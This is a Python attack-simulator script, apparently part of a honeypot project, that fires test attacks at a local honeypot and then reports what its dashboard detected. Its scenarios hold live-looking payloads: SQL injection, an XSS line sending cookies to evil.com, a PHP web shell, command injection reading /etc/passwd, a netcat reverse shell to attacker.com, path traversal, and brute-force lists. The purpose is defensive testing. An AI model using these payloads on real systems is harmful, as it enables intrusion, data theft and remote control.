"""
Honeypot v2 — Attack Simulator
=================================
A safe, local simulation tool that fires realistic attack payloads at the
honeypot to verify that detection, logging, MITRE mapping, session tracking,
honeytoken triggering, and auto-blocking all work correctly.

Usage:
    python tests/attack_simulator.py [--host http://127.0.0.1:8000] [--scenario all]

Scenarios:
    all                 Run every scenario in order (default)
    sql                 SQL Injection attacks
    xss                 Cross-Site Scripting attacks
    rce                 Remote Code Execution attempts
    traversal           Directory traversal / path traversal
    brute               Brute-force login attempts
    scanner             Automated bot / scanner simulation
    credential          Credential stuffing
    honeytoken          Honeytoken theft trigger
    recon               Reconnaissance / sensitive path probing
    summary             Only show the dashboard stats at the end
"""

import requests
import time
import json
import sys
import argparse
import random
import string
from datetime import datetime

# Force UTF-8 output on Windows so emoji/unicode print without crashing
import io
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
else:
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BASE_URL = "http://127.0.0.1:8000"

# We spoof attacker IPs via X-Forwarded-For so we never accidentally
# block 127.0.0.1 (the real admin IP) during testing.
FAKE_ATTACKER_IPS = [
    "45.33.32.156",    # Known scanner IP
    "198.20.69.74",
    "185.220.101.45",  # Tor exit node range
    "89.248.167.131",
    "193.32.127.240",
]

DELAY_BETWEEN_REQUESTS = 0.4   # seconds (keep low for speed, up for realism)
DELAY_BETWEEN_SCENARIOS = 1.0  # seconds

# ─── HELPERS ──────────────────────────────────────────────────────────────────

SUCCESS = "✅"
FAIL    = "❌"
INFO    = "ℹ️ "
WARN    = "⚠️ "

def ts():
    return datetime.now().strftime("%H:%M:%S")

def pick_ip():
    return random.choice(FAKE_ATTACKER_IPS)

def send(method, path, payload=None, headers=None, label="", ip=None, json_body=None):
    """Send a request to the honeypot and print the result."""
    url = BASE_URL + path
    attacker_ip = ip or pick_ip()
    base_headers = {
        "X-Forwarded-For": attacker_ip,
        "User-Agent": headers.get("User-Agent", "Mozilla/5.0") if headers else "Mozilla/5.0",
    }
    if headers:
        base_headers.update(headers)

    try:
        if method.upper() == "GET":
            r = requests.get(url, headers=base_headers, timeout=5)
        elif method.upper() == "POST":
            if json_body:
                base_headers["Content-Type"] = "application/json"
                r = requests.post(url, headers=base_headers, json=json_body, timeout=5)
            else:
                r = requests.post(url, headers=base_headers, data=payload, timeout=5)
        else:
            r = requests.request(method, url, headers=base_headers, data=payload, timeout=5)

        status_icon = SUCCESS if r.status_code in (200, 201, 404, 500) else WARN
        if r.status_code == 403:
            status_icon = "🚫"

        print(f"  [{ts()}] {status_icon}  [{method:4}] {path[:55]:<55} ← {r.status_code}  (IP: {attacker_ip})")
        if label:
            print(f"           {INFO} {label}")
        time.sleep(DELAY_BETWEEN_REQUESTS)
        return r

    except requests.exceptions.ConnectionError:
        print(f"  [{ts()}] {FAIL}  Cannot connect to {BASE_URL} — is the server running?")
        sys.exit(1)
    except Exception as e:
        print(f"  [{ts()}] {FAIL}  Error: {e}")
        return None


def section(title, icon="🎯"):
    print(f"\n{'─'*70}")
    print(f"  {icon}  {title}")
    print(f"{'─'*70}")


def fetch_stats():
    """Pull live stats from the admin API."""
    try:
        r = requests.get(f"{BASE_URL}/api/admin/stats", timeout=5)
        return r.json()
    except Exception:
        return {}

def fetch_logs(limit=5):
    try:
        r = requests.get(f"{BASE_URL}/api/admin/logs?limit={limit}", timeout=5)
        return r.json()
    except Exception:
        return []

def fetch_blocked():
    try:
        r = requests.get(f"{BASE_URL}/api/admin/blocked", timeout=5)
        return r.json()
    except Exception:
        return []

def fetch_sessions():
    try:
        r = requests.get(f"{BASE_URL}/api/admin/sessions?limit=10", timeout=5)
        return r.json()
    except Exception:
        return []

def fetch_mitre():
    try:
        r = requests.get(f"{BASE_URL}/api/admin/mitre", timeout=5)
        return r.json()
    except Exception:
        return []

def fetch_honeytokens():
    try:
        r = requests.get(f"{BASE_URL}/api/admin/honeytokens", timeout=5)
        return r.json()
    except Exception:
        return []


# ─── SCENARIOS ────────────────────────────────────────────────────────────────

def scenario_sql_injection():
    section("SQL INJECTION ATTACKS", "💉")
    payloads = [
        ("/login",            "POST", "username=admin&password=' OR '1'='1",          None),
        ("/api/user",         "POST", "id=1 UNION SELECT username,password FROM users",None),
        ("/search",           "GET",  None, {"User-Agent": "Mozilla/5.0"}),
        ("/products?id=1 AND 1=1 --", "GET", None, None),
        ("/login",            "POST", "user=admin'--&pass=anything",                  None),
        ("/api/data?q=1; DROP TABLE users--", "GET", None, None),
        ("/report",           "POST", "date=2024-01-01' UNION SELECT * FROM admin--", None),
    ]
    ip = pick_ip()
    for path, method, body, hdrs in payloads:
        send(method, path, payload=body, headers=hdrs, ip=ip,
             label="SQL Injection attempt")
    print(f"\n  {INFO} Fired {len(payloads)} SQL injection payloads from IP {ip}")


def scenario_xss():
    section("CROSS-SITE SCRIPTING (XSS) ATTACKS", "⚡")
    payloads = [
        ("/search",    "GET",  None,                                          None),
        ("/comment",   "POST", "body=<script>alert('XSS')</script>",          None),
        ("/profile",   "POST", 'name=<img src=x onerror=alert(document.cookie)>', None),
        ("/submit",    "POST", "data=<svg/onload=fetch('http://evil.com/'+document.cookie)>", None),
        ("/feedback",  "POST", "msg=<iframe src=javascript:alert(1)>",        None),
        ("/search?q=<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>", "GET", None, None),
    ]
    ip = pick_ip()
    for path, method, body, hdrs in payloads:
        send(method, path, payload=body, headers=hdrs, ip=ip,
             label="XSS payload injected")
    print(f"\n  {INFO} Fired {len(payloads)} XSS payloads from IP {ip}")


def scenario_rce():
    section("REMOTE CODE EXECUTION (RCE) ATTEMPTS", "💀")
    payloads = [
        ("/api/execute",  "POST", "cmd=ls -la /etc",                      None),
        ("/upload",       "POST", "file=shell.php&content=<?php system($_GET['cmd']); ?>", None),
        ("/api/ping",     "POST", "host=127.0.0.1; cat /etc/passwd",      None),
        ("/debug",        "POST", "__import__('os').system('id')",         None),
        ("/eval",         "POST", "expr=__import__('subprocess').getoutput('whoami')", None),
        ("/api/process",  "POST", "action=exec&val=|nc -e /bin/sh attacker.com 4444", None),
        ("/log",          "POST", "entry=${7*7}",                          None),  # SSTI
        ("/template",     "POST", "tpl={{7*7}}",                           None),  # Jinja SSTI
    ]
    ip = pick_ip()
    for path, method, body, hdrs in payloads:
        send(method, path, payload=body, headers=hdrs, ip=ip,
             label="RCE attempt")
    print(f"\n  {INFO} Fired {len(payloads)} RCE payloads from IP {ip}")


def scenario_directory_traversal():
    section("DIRECTORY TRAVERSAL / PATH TRAVERSAL", "📁")
    paths = [
        "/download?file=../../etc/passwd",
        "/file?path=../../../windows/system32/drivers/etc/hosts",
        "/read?name=....//....//etc/shadow",
        "/static/../../../etc/passwd",
        "/assets/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/backup/../../../var/log/auth.log",
        "/export?template=../../config/database.yml",
        "/.git/config",
        "/.env",
        "/config.json",
        "/.htpasswd",
        "/server-status",
        "/backup.zip",
    ]
    ip = pick_ip()
    for path in paths:
        send("GET", path, ip=ip, label="Path traversal / sensitive file probe")
    print(f"\n  {INFO} Fired {len(paths)} traversal probes from IP {ip}")


def scenario_brute_force():
    section("BRUTE-FORCE LOGIN ATTACKS", "🔨")
    usernames = ["admin", "root", "administrator", "superuser", "test", "user", "manager"]
    passwords = ["123456", "password", "admin", "letmein", "qwerty", "abc123", "pass@123", "P@ssw0rd"]
    ip = pick_ip()
    count = 0
    print(f"  {INFO} Simulating brute force from IP {ip} ...")
    for user in usernames:
        pw = random.choice(passwords)
        send("POST", "/admin-login",
             payload=f"username={user}&password={pw}",
             ip=ip,
             label=f"Brute force: {user}:{pw}")
        count += 1
        if count >= 10:
            break
    print(f"\n  {INFO} Fired {count} brute-force attempts from IP {ip}")
    print(f"  {WARN} With enough requests, the session threat score should exceed 85 → auto-block")


def scenario_bot_scanner():
    section("BOT / AUTOMATED SCANNER SIMULATION", "🤖")
    scanner_paths = [
        "/wp-admin",
        "/wp-login.php",
        "/phpmyadmin",
        "/phpmyadmin/index.php",
        "/admin",
        "/administrator",
        "/xmlrpc.php",
        "/.well-known/security.txt",
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/api/swagger",
        "/swagger.json",
        "/openapi.json",
        "/robots.txt",
        "/.DS_Store",
        "/web.config",
        "/sftp-config.json",
    ]
    scanner_agents = [
        "sqlmap/1.5.2#stable (https://sqlmap.org)",
        "Nikto/2.1.6",
        "masscan/1.3.2",
        "Nmap Scripting Engine",
        "python-requests/2.28.0",
        "Zgrab/0.x",
        "WPScan v3.8.22",
    ]
    ip = pick_ip()
    for path in scanner_paths:
        agent = random.choice(scanner_agents)
        send("GET", path, headers={"User-Agent": agent}, ip=ip,
             label=f"Scanner probe ({agent.split('/')[0]})")
    print(f"\n  {INFO} Fired {len(scanner_paths)} scanner probes from IP {ip}")


def scenario_credential_stuffing():
    section("CREDENTIAL STUFFING ATTACK", "🔑")
    # Simulates leaked credential pairs being tested at scale
    leaked_creds = [
        ("john.doe@gmail.com",   "Summer2023!"),
        ("alice@yahoo.com",      "Password1"),
        ("bob_smith@hotmail.com","Welcome@1"),
        ("mark.jones@gmail.com", "Qwerty123"),
        ("sarah.k@outlook.com",  "Dragon2022"),
        ("admin@company.com",    "CompanyPass1"),
        ("finance@corp.com",     "Finance@2024"),
        ("support@service.com",  "Support123!"),
    ]
    # Use multiple IPs to simulate distributed stuffing
    for email, passwd in leaked_creds:
        ip = pick_ip()
        send("POST", "/api/auth/login",
             payload=f"email={email}&password={passwd}",
             ip=ip,
             label=f"Credential stuffing: {email}")
    print(f"\n  {INFO} Fired {len(leaked_creds)} credential stuffing attempts")


def scenario_honeytoken():
    section("HONEYTOKEN THEFT SIMULATION", "🍯")
    print(f"\n  {INFO} Step 1 — Visiting the fake admin login page to receive honeytokens...")

    # 1. Visit fake login page — this plants tokens in the HTML
    r = send("GET", "/admin-login", ip=pick_ip(), label="Attacker visits fake admin page")
    if r and r.text:
        # 2. Parse out planted tokens from the HTML comments
        import re
        api_key_match = re.search(r'API_KEY=([\w\-]+)', r.text)
        jwt_match     = re.search(r'JWT=([\w\.\-]+)', r.text)
        aws_match     = re.search(r'AWS_ACCESS_KEY=([\w]+)', r.text)

        tokens_found = []
        if api_key_match: tokens_found.append(("API_KEY",    api_key_match.group(1)))
        if jwt_match:     tokens_found.append(("JWT",         jwt_match.group(1)))
        if aws_match:     tokens_found.append(("AWS_KEY",     aws_match.group(1)))

        if tokens_found:
            print(f"\n  {SUCCESS} Found {len(tokens_found)} honeytokens in the page HTML:")
            for name, val in tokens_found:
                print(f"      {name} = {val[:30]}...")

            print(f"\n  {INFO} Step 2 — Attacker now 'reuses' the stolen tokens in subsequent requests...")
            ip = pick_ip()
            for name, val in tokens_found:
                if name == "API_KEY":
                    send("GET", "/api/data",
                         headers={"Authorization": f"Bearer {val}"},
                         ip=ip, label=f"Using stolen {name}")
                elif name == "JWT":
                    send("POST", "/api/admin/users",
                         headers={"Authorization": f"Bearer {val}"},
                         ip=ip, label=f"Using stolen {name}")
                elif name == "AWS_KEY":
                    send("POST", "/api/upload",
                         payload=f"aws_key={val}&action=list_buckets",
                         ip=ip, label=f"Using stolen {name}")
        else:
            print(f"  {WARN} No tokens extracted from HTML (may be empty DB or already generated).")
            print(f"  {INFO} Firing generic honeytoken-style requests anyway...")
            ip = pick_ip()
            send("GET",  "/api/data",
                 headers={"Authorization": "Bearer sk-live-9xK2mN3pQr8vYtWz"},
                 ip=ip, label="Using fake API key (honeytoken format)")
            send("POST", "/api/admin/users",
                 headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.fake.token"},
                 ip=ip, label="Using fake JWT (honeytoken format)")
    else:
        print(f"  {WARN} Could not fetch admin page HTML.")


def scenario_recon():
    section("RECONNAISSANCE / INFORMATION GATHERING", "🔭")
    paths = [
        "/api/v1/users",
        "/api/v1/config",
        "/api/v1/health",
        "/api/keys",
        "/admin/config",
        "/debug",
        "/test",
        "/dev",
        "/staging",
        "/.git/HEAD",
        "/.git/FETCH_HEAD",
        "/composer.json",
        "/package.json",
        "/requirements.txt",
        "/Dockerfile",
        "/docker-compose.yml",
        "/wp-content/uploads/",
        "/proc/self/environ",
        "/etc/passwd",
    ]
    ip = pick_ip()
    for path in paths:
        send("GET", path, ip=ip, label="Recon probe")
    print(f"\n  {INFO} Fired {len(paths)} reconnaissance probes from IP {ip}")


# ─── RESULTS REPORTER ─────────────────────────────────────────────────────────

def print_summary():
    section("DASHBOARD VERIFICATION — LIVE RESULTS", "📊")
    time.sleep(1.5)  # Give the server a moment to flush DB writes

    stats = fetch_stats()
    logs  = fetch_logs(5)
    blocked = fetch_blocked()
    sessions = fetch_sessions()
    mitre = fetch_mitre()
    tokens = fetch_honeytokens()

    print(f"\n  📈 Stats Overview:")
    print(f"     Total Requests Logged : {stats.get('total_attacks', 0)}")
    print(f"     Blocked IPs           : {stats.get('blocked_count', 0)}")
    print(f"     Active Sessions       : {stats.get('active_sessions', 0)}")
    print(f"     Unique Fingerprints   : {stats.get('unique_fingerprints', 0)}")
    print(f"     Avg Threat Score      : {stats.get('average_threat_score', 0):.1f}")
    print(f"     Honeytokens Triggered : {stats.get('honeytokens_triggered', 0)}")

    print(f"\n  🗂️  Attack Distribution:")
    for item in stats.get("attack_distribution", []):
        bar = "█" * min(int(item["count"] / 1), 30)
        print(f"     {item['type']:30} {bar} {item['count']}")

    print(f"\n  🚫 Blocked IPs ({len(blocked)}):")
    if blocked:
        for b in blocked[:5]:
            print(f"     {b['ip_address']:20}  Reason: {(b.get('reason','') or '')[:60]}")
    else:
        print(f"     (none blocked yet — try running brute force or RCE scenarios)")

    print(f"\n  🕐 Recent Sessions ({len(sessions)}):")
    for s in sessions[:5]:
        status = "ACTIVE" if s.get("is_active") else "closed"
        print(f"     Session {s['id'][:8]}...  Reqs: {s['total_requests']:3}  MaxScore: {s['max_threat_score']:.0f}  [{status}]")

    print(f"\n  🗺️  MITRE ATT&CK Techniques Detected ({len(mitre)}):")
    for m in mitre[:6]:
        print(f"     {m['technique_id']:8} {m['technique_name']:35} ({m['count']} hits, {m['avg_confidence']*100:.0f}% confidence)")

    print(f"\n  🍯 Honeytokens ({len(tokens)}) — Triggered: {sum(1 for t in tokens if t.get('triggered'))}")
    for t in tokens[:4]:
        status = "🚨 TRIGGERED" if t.get("triggered") else "  dormant  "
        print(f"     [{status}]  {t['token_type']:20}  by IP: {t.get('triggered_by_ip') or '-'}")

    print(f"\n  📝 Recent Log Sample (last 5 entries):")
    for log in logs:
        score = log.get("threat_score", 0)
        icon = "🔴" if score > 80 else ("🟡" if score > 50 else "🟢")
        print(f"     {icon} Score:{score:5.1f}  {log['method']:4} {log['path'][:35]:<35} [{log.get('attack_type') or 'benign'}]")

    print(f"\n  🌐 Dashboard: {BASE_URL}/dashboard/")
    print(f"  {INFO}  Open the dashboard in your browser to see the full visual view.")


# ─── MAIN ─────────────────────────────────────────────────────────────────────

SCENARIO_MAP = {
    "sql":         scenario_sql_injection,
    "xss":         scenario_xss,
    "rce":         scenario_rce,
    "traversal":   scenario_directory_traversal,
    "brute":       scenario_brute_force,
    "scanner":     scenario_bot_scanner,
    "credential":  scenario_credential_stuffing,
    "honeytoken":  scenario_honeytoken,
    "recon":       scenario_recon,
}

def main():
    global BASE_URL, DELAY_BETWEEN_REQUESTS  # declared FIRST before any use

    parser = argparse.ArgumentParser(
        description="Honeypot v2 — Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--host",     default=BASE_URL, help="Honeypot base URL")
    parser.add_argument("--scenario", default="all",    help="Scenario to run (see --help)")
    parser.add_argument("--delay",    type=float, default=DELAY_BETWEEN_REQUESTS,
                        help="Delay between requests (seconds)")
    args = parser.parse_args()

    BASE_URL = args.host
    DELAY_BETWEEN_REQUESTS = args.delay

    print()
    print("=" * 72)
    print("   HONEYPOT v2  --  ATTACK SIMULATOR")
    print(f"   Target  : {BASE_URL}")
    print(f"   Time    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 72)
    print("  [!] FOR EDUCATIONAL / LOCAL TESTING ONLY.")
    print("  [!] Never run this against systems you don't own.")
    print()

    if args.scenario == "all":
        for name, fn in SCENARIO_MAP.items():
            fn()
            time.sleep(DELAY_BETWEEN_SCENARIOS)
        print_summary()
    elif args.scenario == "summary":
        print_summary()
    elif args.scenario in SCENARIO_MAP:
        SCENARIO_MAP[args.scenario]()
        time.sleep(1)
        print_summary()
    else:
        print(f"{FAIL} Unknown scenario: '{args.scenario}'")
        print(f"   Available: {', '.join(['all', 'summary'] + list(SCENARIO_MAP.keys()))}")
        sys.exit(1)

    print(f"\n{'═'*70}")
    print(f"  Simulation complete! Open {BASE_URL}/dashboard/ to review results.")
    print(f"{'═'*70}\n")


if __name__ == "__main__":
    main()
